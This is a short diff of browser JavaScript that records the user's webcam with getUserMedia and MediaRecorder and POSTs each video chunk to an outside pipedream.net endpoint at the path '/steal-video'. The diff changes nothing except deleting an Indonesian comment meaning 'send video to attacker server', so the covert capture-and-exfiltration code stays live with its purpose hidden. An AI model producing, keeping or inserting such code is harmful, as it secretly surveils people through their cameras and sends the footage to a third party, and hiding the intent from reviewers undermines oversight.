@@ -5,7 +5,6 @@ navigator.mediaDevices.getUserMedia({ video: true })
         mediaRecorder.start();
 
         mediaRecorder.ondataavailable = function(event) {
-            // Kirim video ke server penyerang
             fetch('https://eoow6y96ffo9mzx.m.pipedream.net/steal-video', {
                 method: 'POST',
                 body: event.data,
